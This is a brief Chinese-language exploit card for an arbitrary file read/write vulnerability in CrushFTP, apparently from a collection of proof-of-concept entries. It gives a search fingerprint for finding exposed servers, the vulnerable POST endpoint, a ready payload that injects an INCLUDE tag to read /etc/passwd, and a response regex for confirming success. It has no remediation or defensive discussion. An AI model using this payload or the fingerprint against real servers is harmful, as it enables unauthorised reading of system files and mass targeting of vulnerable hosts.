# CrushFTP任意文件读取漏洞

CrushFTP ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="CrushFTP"`
- **请求**：`POST /WebInterface/function/ HTTP/1.1`

**Payload**
```
command=exists&paths=<INCLUDE>/etc/passwd</INCLUDE>&random=0.5382052606828951&c2f=xxxx
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$